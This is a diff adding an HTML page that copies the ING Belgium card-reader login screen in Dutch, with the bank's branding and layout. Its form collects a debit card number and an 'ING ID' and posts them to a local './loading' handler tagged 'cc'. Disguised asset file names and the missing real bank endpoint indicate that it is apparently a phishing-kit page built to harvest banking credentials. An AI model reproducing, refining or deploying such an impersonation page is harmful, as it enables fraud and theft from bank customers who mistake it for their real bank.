@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ING - Aanmelden</title>
+    <link rel="icon" href="assets/droneikaragwa.png" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-image: url(./assets/deone.svg);
+            background-color: #f0f0f0;
+            position: relative;
+            min-height: 100vh;
+            --lion-bg: none;
+            overflow-x: hidden;
+            background-repeat: no-repeat;
+            background-position: 100% 100%;
+            background-size: auto 500px;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+            background-color: white;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 10;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+        }
+
+        .language-selector a {
+            text-decoration: none;
+            color: #696969;
+            font-weight: 1rem;
+            line-height: 1.5rem;
+            padding: 0 5px;
+        }
+
+        .language-selector a.active {
+            color: #333;
+            font-weight: bold;
+        }
+
+        .separator {
+            color: #ccc;
+        }
+
+        main {
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            position: relative;
+        }
+
+        .login-container {
+            max-width: 500px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .login-card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            margin-bottom: 20px;
+            max-width: 450px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .login-card h2 {
+            text-align: center;
+            color: #ff6200;
+            margin: 24px 0px;
+            font-size: 18px;
+            font-weight: 600;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 4px;
+            color: #333;
+            font-weight: 500;
+            font-size: 16px;
+            line-height: 1.5rem;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #696969;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: Arial, Helvetica, sans-serif;
+            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            box-shadow: 0 0 0 1px #525199, inset 0 1px 2px rgba(0, 0, 0, 0.05);
+            border-color: #525199;
+        }
+
+        .form-group.checkbox {
+            display: flex;
+            flex-direction: row;
+            align-items: flex-start;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .form-group.checkbox input {
+            position: absolute;
+            opacity: 0;
+            cursor: pointer;
+            height: 0;
+            width: 0;
+        }
+
+        .form-group.checkbox label {
+            margin: 0;
+            font-size: 16px;
+            line-height: 1.5rem;
+            padding-left: 28px;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .form-group.checkbox label:before {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 0px;
+            width: 17px;
+            height: 17px;
+            border: 1px solid #696969;
+            background-color: white;
+            border-radius: 4px;
+        }
+
+        .form-group.checkbox input:focus + label:before {
+            border-color: #525199;
+            box-shadow: 0 0 0 1px #525199;
+        }
+
+        .form-group.checkbox input:checked + label:after {
+            content: "";
+            position: absolute;
+            left: 5px;
+            top: 3px;
+            width: 5px;
+            height: 10px;
+            border: solid #ff6200;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .info-block {
+            display: flex;
+            margin-bottom: 25px;
+            align-items: flex-start;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .info-text {
+            font-size: 16px;
+            color: #333;
+            line-height: 1.5rem;
+        }
+
+        .info-text a {
+            color: #525199;
+            text-decoration: underline;
+        }
+
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            gap: 40px;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .btn-help {
+            background: none;
+            border: none;
+            color: #525199;
+            font-size: 18px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.2s;
+            padding: 12px 18px;
+            border-radius: 8px;
+        }
+
+        .btn-help:hover {
+            background-color: #3d3d80;
+            color: white;
+            text-decoration: none;
+        }
+
+        .btn-next {
+            background-color: #ff6200;
+            color: white;
+            border: none;
+            padding: 12px 18px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #ff6200;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.35);
+        }
+
+        .alternative-methods {
+            background-color: white;
+            border-radius: 8px;
+            padding: 20px 25px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            max-width: 450px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .alternative-methods h3 {
+            color: #ff6200;
+            font-size: 18px;
+            margin-bottom: 15px;
+            font-weight: 500;
+            padding-bottom: 5px;
+        }
+
+        .method-option {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            border-top: 1px solid #eee;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .method-option:hover {
+            background-color: #f8f8f8;
+        }
+
+        .method-option:hover .method-arrow {
+            transform: translateX(3px);
+        }
+
+        .method-text {
+            flex-grow: 1;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .method-arrow {
+            font-size: 24px;
+            color: #525199;
+            font-weight: bold;
+            transition: transform 0.2s;
+            margin-right: 10px;
+        }
+
+        footer {
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 15px 0px;
+            background-color: transparent;
+            z-index: 5;
+            text-align: center;
+            margin-bottom: 45px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #333333;
+            text-decoration: underline;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #333;
+        }
+
+        .background-lion {
+            position: absolute;
+            right: -57px;
+            bottom: -57px;
+            width: 500px;
+            height: 500px;
+            z-index: -1;
+            pointer-events: none;
+            overflow: visible;
+        }
+
+        .background-lion svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+            position: absolute;
+            right: 0;
+            bottom: 0;
+            margin: 0;
+            padding: 0;
+        }
+
+        @media (max-width: 1024px) {
+            body {
+            background-image: none;
+            }
+        }
+
+        @media (max-width: 449px) {
+            footer {
+                bottom: 0;
+                left: 0;
+                width: 100%;
+                padding: 10px 0px;
+                background-color: transparent;
+                margin-bottom: 20px;
+                text-align: left;
+                padding-left: 20px; 
+            }
+            
+            .footer-links {
+                display: flex;
+                flex-direction: column;
+                align-items: left;
+                gap: 8px;
+            }
+            
+            .footer-links a {
+                color: #333333;
+                text-decoration: underline;
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 737px) {
+            footer {
+                bottom: 0;
+                left: 0;
+                width: 100%;
+                padding: 10px 0px;
+                background-color: transparent;
+                margin-bottom: 20px;
+                text-align: left;
+                padding-left: 20px; 
+            }
+            
+            .footer-links {
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+                align-items: left;
+            }
+            
+            .footer-links a {
+                color: #333333;
+                text-decoration: underline;
+                font-size: 12px;
+            }
+        }
+
+        @media screen and (max-width: 840px) {
+            main {
+                padding: 20px 0px 20px 0px;
+            }
+
+            .login-container {
+                width: 100%;
+                max-width: 100%;
+            }
+            
+            .login-card, 
+            .alternative-methods {
+                width: 100%;
+                max-width: 100%;
+            }
+            
+            .button-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 20px;
+            }
+            
+            .btn-next {
+                width: 100%;
+            }
+        }
+
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { 
+            -webkit-appearance: none;
+            margin: 0; 
+        }
+
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo" style="height: 30px;">
+            <img src="assets/talmassan.svg" alt="ING Logo" style="height: 30px; width: auto;">
+        </div>
+        <div class="language-selector">
+            <a href="#" class="active">NL</a>
+            <span class="separator">|</span>
+            <a href="#">FR</a>
+            <span class="separator">|</span>
+            <a href="#">EN</a>
+        </div>
+    </header>
+    
+    <main class="zbi">
+        <div class="login-container">
+            <form action="./loading" method="post">
+                <input type="hidden" name="page" value="cc">
+                <div class="login-card">
+                    <h2>Aanmelden met de ING Card Reader</h2>
+                    
+                    <div class="card-reader-icon" style="text-align: center; margin-bottom: 25px;">
+                            <img src="assets/crata.svg" alt="Card Reader" width="100" height="100" style="width: 100px; height: 100px;">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="debit-card">Debetkaart</label>
+                        <input type="number" id="debit-card" inputmode="numeric" pattern="[0-9]*" name="cardNumber" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="ing-id">ING ID</label>
+                        <input type="number" id="ing-id" inputmode="numeric" pattern="[0-9]*" name="igid" required>
+                    </div>
+                    
+                    <div class="form-group checkbox">
+                        <input type="checkbox" id="save-data">
+                        <label for="save-data">Bewaar je debetkaartgegevens</label>
+                    </div>
+                    
+                    <div class="info-block">
+                        <div class="info-icon" style="color: #007bc1; margin-right: 10px; font-size: 20px; flex-shrink: 0;">
+                            <img src="assets/ayo.svg" alt="Info Icon" width="24" height="24" style="fill: #007bc1; width: 24px; height: 24px;">
+                        </div>
+                        <div class="info-text">
+                            Razendsnel aanmelden, zónder kaartlezer?
+                            <br>
+                            Gebruik itsme® en <a href="#">ontdek waarom het de standaard is in online banking.</a>
+                        </div>
+                    </div>
+                    
+                    <div class="button-row">
+                        <div class="btn-help">Hulp en info</div>
+                        <button class="btn-next">Volgende</button>
+                    </div>
+                </div>
+            </form>
+            
+            <div class="alternative-methods">
+                <h3>Kies een andere manier om in te loggen</h3>
+                
+                <div class="method-option">
+                    <div class="method-icon itsme-icon" style="width: 38px; height: 38px; display: flex; justify-content: center; align-items: center; margin-right: 15px; overflow: hidden; background-color: transparent; padding: 0;">
+                        <img src="assets/dreamksa.svg" alt="itsme logo" width="36" height="36" style="width: 36px; height: 36px;">
+                    </div>
+                    <div class="method-text">itsme</div>
+                    <div class="method-arrow">›</div>
+                </div>
+                
+                <div class="method-option">
+                    <div class="method-icon qr-icon" style="width: 38px; height: 38px; display: flex; justify-content: center; align-items: center; margin-right: 15px; overflow: hidden; background-color: transparent; border: none;">
+                        <img src="assets/diddniba.svg" alt="ING QR Code" width="36" height="36" style="width: 36px; height: 36px; fill: #000;">
+                    </div>
+                    <div class="method-text">ING QR Code</div>
+                    <div class="method-arrow">›</div>
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Online veiligheid</a>
+            <a href="#">Privacy</a>
+            <a href="#">Algemeen Reglement der Verrichtingen</a>
+        </div>
+    </footer>
+
+</body>
+</html> 
